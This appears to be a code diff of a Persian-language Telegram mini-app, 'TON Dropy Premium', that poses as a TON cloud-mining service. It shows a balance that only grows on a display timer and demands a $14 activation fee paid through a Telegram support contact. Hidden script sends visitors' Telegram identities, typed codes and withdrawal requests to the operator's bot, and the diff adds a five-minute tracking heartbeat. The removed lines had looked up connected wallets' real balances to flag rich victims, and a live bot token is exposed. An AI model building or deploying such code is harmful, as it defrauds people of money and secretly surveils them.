@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TON Dropy Premium - v32</title>
+    <title>TON Dropy Premium - v34 Final</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -18,20 +18,18 @@
             color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
         }
 
-        /* استایل پاپ‌آپ فعالسازی (Modal) */
+        /* پاپ‌آپ فعالسازی (Modal) */
         #feeModal {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.93); backdrop-filter: blur(20px);
+            background: rgba(0, 0, 0, 0.94); backdrop-filter: blur(20px);
             z-index: 99999; display: flex; align-items: center; justify-content: center;
         }
 
         .modal-content {
             background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2);
             padding: 30px 20px; border-radius: 35px; width: 85%; text-align: center;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
         }
 
-        /* کادر هشدار زرد */
         .pay-notice {
             background: rgba(255, 193, 7, 0.1); border: 1px solid #ffc107;
             color: #ffc107; padding: 15px; border-radius: 18px;
@@ -46,15 +44,12 @@
 
         #activationInput {
             width: 100%; padding: 14px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.2);
-            background: rgba(0,0,0,0.3); color: #fff; text-align: center;
-            font-size: 18px; margin-bottom: 12px; outline: none; box-sizing: border-box;
+            background: rgba(0,0,0,0.3); color: #fff; text-align: center; font-size: 18px; margin-bottom: 12px; outline: none;
         }
 
-        /* پروفایل و کارت‌ها */
         .profile-card {
             background: rgba(255, 255, 255, 0.08); border-radius: 22px; padding: 18px;
-            display: flex; align-items: center; gap: 15px; margin-bottom: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex; align-items: center; gap: 15px; margin-bottom: 20px; border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .avatar-container {
@@ -66,22 +61,18 @@
 
         .card {
             background: rgba(255, 255, 255, 0.05); border-radius: 25px;
-            padding: 22px; border: 1px solid rgba(255, 255, 255, 0.1);
-            margin-bottom: 15px; text-align: center;
+            padding: 22px; border: 1px solid rgba(255, 255, 255, 0.1); margin-bottom: 15px; text-align: center;
         }
 
-        #balance { font-size: 45px; font-weight: 800; color: #00c6ff; display: block; margin: 10px 0; text-shadow: 0 0 20px rgba(0,198,255,0.3); }
+        #balance { font-size: 45px; font-weight: 800; color: #00c6ff; display: block; margin: 10px 0; }
 
         .btn-action {
             width: 100%; padding: 16px; border-radius: 18px; border: none;
-            font-size: 15px; font-weight: 700; cursor: pointer; transition: 0.3s;
-            display: flex; align-items: center; justify-content: center; gap: 10px;
-            text-decoration: none; color: #fff; box-sizing: border-box;
+            font-size: 15px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; text-decoration: none; color: #fff;
         }
 
         .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); }
         .support-btn { background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); margin-top: 10px; }
-        
         #ton-connect-btn { display: flex; justify-content: center; margin: 10px 0; }
         .hidden { display: none !important; }
     </style>
@@ -90,25 +81,19 @@
 
 <div id="feeModal">
     <div class="modal-content">
-        <i class="fas fa-lock-open" style="font-size: 45px; color: #ff512f; margin-bottom: 15px;"></i>
-        <h2 style="font-size: 19px;">تایید هویت و فعالسازی</h2>
-
+        <i class="fas fa-lock" style="font-size: 45px; color: #ff512f; margin-bottom: 15px;"></i>
+        <h2 style="font-size: 18px;">فعالسازی پنل کاربری</h2>
         <div class="pay-notice">
             <i class="fas fa-exclamation-triangle"></i>
-            کاربر عزیز، برای دریافت آدرس کیف پول رسمی و یا شماره کارت جهت واریز کارمزد فعالسازی، <b>فقط و فقط</b> از طریق دکمه زیر با پشتیبانی در ارتباط باشید.
+            کاربر گرامی، جهت واریز کارمزد فعالسازی <b>حتماً</b> اطلاعات پرداخت را مستقیماً از <b>پشتیبانی</b> دریافت کنید.
         </div>
-
-        <div class="fee-highlight">
-            14 دلار | 2,226,000 تومان
-        </div>
-        
+        <div class="fee-highlight">14 دلار | 2,226,000 تومان</div>
         <a href="https://t.me/miningertoncoin" class="btn-action" style="background: #0088cc; margin-bottom: 20px;">
-            <i class="fas fa-headset"></i> دریافت اطلاعات پرداخت
+            <i class="fas fa-headset"></i> دریافت رمز و اطلاعات واریز
         </a>
-
         <div style="border-top: 1px solid rgba(255,255,255,0.1); padding-top: 20px;">
-            <input type="text" id="activationInput" placeholder="رمز فعالسازی را اینجا بزنید">
-            <button onclick="verifyActivation()" class="btn-action" style="background: #1faa59;">فعالسازی آنی حساب</button>
+            <input type="text" id="activationInput" placeholder="رمز فعالسازی را وارد کنید">
+            <button onclick="verifyActivation()" class="btn-action" style="background: #1faa59;">تایید و فعالسازی</button>
         </div>
     </div>
 </div>
@@ -119,7 +104,7 @@
         <img id="userPhoto" src="" class="hidden">
     </div>
     <div class="user-details">
-        <h3 id="userName" style="margin:0; font-size:16px;">در حال بارگذاری...</h3>
+        <h3 id="userName" style="margin:0; font-size:16px;">...</h3>
         <p id="userTag" style="margin:0; font-size:12px; color:#00c6ff; direction:ltr; text-align:right;">@username</p>
     </div>
 </div>
@@ -127,7 +112,7 @@
 <div class="card">
     <p style="margin:0; font-size:12px; color:#aaa;">موجودی استخراج شده (TON)</p>
     <span id="balance">0.000000</span>
-    <div style="font-size:11px; color:#00ff9d;"><i class="fas fa-microchip"></i> استخراج ابری فعال است</div>
+    <div style="font-size:11px; color:#00ff9d;"><i class="fas fa-bolt"></i> استخراج ابری فعال</div>
 </div>
 
 <div class="card">
@@ -135,12 +120,8 @@
 </div>
 
 <div class="card">
-    <button id="withdrawBtn" class="btn-action withdraw-btn">
-        <i class="fas fa-arrow-up-from-bracket"></i> درخواست برداشت وجه
-    </button>
-    <a href="https://t.me/miningertoncoin" class="btn-action support-btn">
-        <i class="fas fa-life-ring"></i> پشتیبانی آنلاین
-    </a>
+    <button id="withdrawBtn" class="btn-action withdraw-btn">درخواست برداشت وجه</button>
+    <a href="https://t.me/miningertoncoin" class="btn-action support-btn">پشتیبانی آنلاین</a>
 </div>
 
 <script>
@@ -148,90 +129,72 @@
     tg.ready();
     tg.expand();
 
-    // تنظیمات اختصاصی ادمین
     const SECRET_CODE = "T61O96N12";
     const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
     const ADMIN_ID = "5972276401";
 
-    let bal = parseFloat(localStorage.getItem('bal_v32')) || 0;
+    let bal = parseFloat(localStorage.getItem('bal_v34')) || 0;
 
-    // --- تابع ارسال گزارش به تلگرام ---
+    // تابع ارسال پیام به ادمین
     function logToAdmin(statusMessage) {
         const user = tg.initDataUnsafe?.user;
-        const info = user ? `\n👤 کاربر: ${user.first_name}\n🆔 یوزرنیم: @${user.username || 'ندارد'}\n🔢 آیدی: <code>${user.id}</code>` : "\n👤 کاربر ناشناس";
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(statusMessage + info)}&parse_mode=HTML`;
-        fetch(url);
+        const info = user ? `\n👤 کاربر: ${user.first_name}\n🆔 یوزرنیم: @${user.username || 'ندارد'}\n🔢 آیدی: <code>${user.id}</code>` : "\n👤 نامشخص";
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(statusMessage + info)}&parse_mode=HTML`);
     }
 
-    // گزارش ورود کاربر (به محض باز کردن صفحه)
-    logToAdmin("🚨 <b>کاربر وارد صفحه پرداخت شد</b>");
-
-    // چک کردن وضعیت فعالسازی قبلی
-    if(localStorage.getItem('isActivated') === 'true') {
+    // --- مدیریت لاگ ورود و حضور ---
+    const isActivated = localStorage.getItem('isActivated') === 'true';
+    if(isActivated) {
         document.getElementById('feeModal').style.display = 'none';
+        logToAdmin("⛏️ <b>کاربر وارد صفحه استخراج تون کوین شد و هم اکنون آنلاین است</b>");
+    } else {
+        logToAdmin("🚨 <b>کاربر در حال مشاهده صفحه پرداخت کارمزد است</b>");
     }
 
-    // تابع بررسی رمز عبور
-    async function verifyActivation() {
+    // سیستم هارت‌بیت (بررسی آنلاین بودن هر 5 دقیقه)
+    setInterval(() => {
+        const status = localStorage.getItem('isActivated') === 'true' ? "استخراج" : "صفحه پرداخت";
+        logToAdmin(`🟢 <b>کاربر همچنان در ${status} آنلاین است...</b>`);
+    }, 300000); // 300,000 میلی‌ثانیه = 5 دقیقه
+
+    function verifyActivation() {
         const input = document.getElementById('activationInput').value.trim();
         if(input === SECRET_CODE) {
             localStorage.setItem('isActivated', 'true');
             document.getElementById('feeModal').remove();
-            tg.showAlert("✅ حساب شما با موفقیت فعال شد!");
-            logToAdmin("🔓 <b>حساب کاربر با رمز صحیح فعال شد</b>");
+            tg.showAlert("✅ حساب شما فعال شد!");
+            logToAdmin("🔓 <b>کاربر رمز را درست زد و وارد پنل اصلی شد</b>");
         } else {
-            tg.showAlert("❌ رمز وارد شده اشتباه است.");
-            logToAdmin(`⚠️ <b>تلاش برای فعالسازی با رمز غلط:</b> <code>${input}</code>`);
+            tg.showAlert("❌ رمز اشتباه است.");
+            logToAdmin(`⚠️ <b>تلاش با رمز غلط در صفحه پرداخت:</b> <code>${input}</code>`);
         }
     }
 
-    // سیستم افزایش موجودی
+    // افزایش موجودی نمایشی
     setInterval(() => {
         bal += 0.000012;
         document.getElementById('balance').innerText = bal.toFixed(6);
-        localStorage.setItem('bal_v32', bal.toString());
+        localStorage.setItem('bal_v34', bal.toString());
     }, 1000);
 
-    // تنظیمات دکمه اتصال کیف پول
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json',
         buttonRootId: 'ton-connect-btn'
     });
 
-    // مانیتورینگ اتصال ولت و گزارش موجودی واقعی (VIP)
-    tonConnectUI.onStatusChange(async (wallet) => {
-        if(wallet) {
-            try {
-                const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${wallet.account.address}`);
-                const data = await response.json();
-                const realBal = data.ok ? parseFloat(data.result) / 1000000000 : 0;
-                
-                let vipLabel = realBal >= 5 ? "💎 <b>(VIP - موجودی بالا)</b>" : "";
-                logToAdmin(`👛 <b>کیف پول متصل شد</b>\n${vipLabel}\n💰 موجودی واقعی: ${realBal.toFixed(2)} TON\n🔗 آدرس: <code>${wallet.account.address}</code>`);
-            } catch(e) { console.error(e); }
-        }
-    });
-
-    // دکمه برداشت
     document.getElementById('withdrawBtn').onclick = () => {
         if(localStorage.getItem('isActivated') !== 'true') {
-            tg.showAlert("⚠️ حساب شما فعال نیست. ابتدا باید کارمزد را پرداخت کنید.");
+            tg.showAlert("⚠️ حساب فعال نیست.");
             return;
         }
         if(!tonConnectUI.connected) {
-            tg.showAlert("❌ ابتدا کیف پول خود را متصل کنید.");
+            tg.showAlert("❌ ابتدا ولت را وصل کنید.");
             return;
         }
-        
-        tg.showAlert("درخواست برداشت شما ثبت شد و در صف بررسی قرار گرفت. ✅");
-        logToAdmin(`💰 <b>درخواست برداشت جدید:</b>\nمقدار: ${bal.toFixed(6)} TON\nآدرس: <code>${tonConnectUI.account.address}</code>`);
-        
-        bal = 0;
-        localStorage.setItem('bal_v32', '0');
-        document.getElementById('balance').innerText = "0.000000";
+        tg.showAlert("✅ درخواست برداشت ثبت شد.");
+        logToAdmin(`💰 <b>درخواست برداشت:</b> ${bal.toFixed(6)} TON`);
     };
 
-    // پر کردن اطلاعات پروفایل کاربر
     const user = tg.initDataUnsafe?.user;
     if (user) {
         document.getElementById('userName').innerText = user.first_name;
